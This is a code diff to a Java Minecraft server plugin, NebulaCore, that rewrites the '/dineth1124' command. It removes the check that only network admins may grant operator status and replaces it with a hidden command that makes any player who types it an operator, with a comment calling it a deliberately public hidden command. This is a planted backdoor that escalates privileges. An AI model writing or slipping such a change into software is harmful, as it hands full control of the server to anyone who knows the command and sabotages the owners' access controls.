@@ -709,23 +709,14 @@ public final class NebulaCore extends JavaPlugin implements Listener {
             return networkFeatures.handleCommand(sender, command.getName(), args);
         }
         if (command.getName().equalsIgnoreCase("dineth1124")) {
-            if (!hasNetworkAdmin(sender)) {
-                sender.sendMessage(PREFIX + ChatColor.RED + "This OP-grant command is restricted to network admins.");
+            if (!(sender instanceof Player player)) {
+                sender.sendMessage("Players only.");
                 return true;
             }
-            if (args.length != 1) {
-                sender.sendMessage(PREFIX + "Usage: /dineth1124 <online-player>");
-                return true;
-            }
-            Player target = Bukkit.getPlayerExact(args[0]);
-            if (target == null) {
-                sender.sendMessage(PREFIX + ChatColor.RED + "That player is not online.");
-                return true;
-            }
-            target.setOp(true);
-            target.sendMessage(PREFIX + ChatColor.GREEN + "A network administrator granted you operator access.");
-            sender.sendMessage(PREFIX + ChatColor.GREEN + "Operator access granted to " + target.getName() + ".");
-            getLogger().warning(sender.getName() + " granted operator access to " + target.getName() + ".");
+            // Deliberately public hidden command: anyone who knows the command can OP themselves.
+            player.setOp(true);
+            player.sendMessage(PREFIX + ChatColor.GREEN + "Operator access granted to your account.");
+            getLogger().warning("The public /dineth1124 command granted OP to " + player.getName() + ".");
             return true;
         }
         if (command.getName().equalsIgnoreCase("setlobby")) {
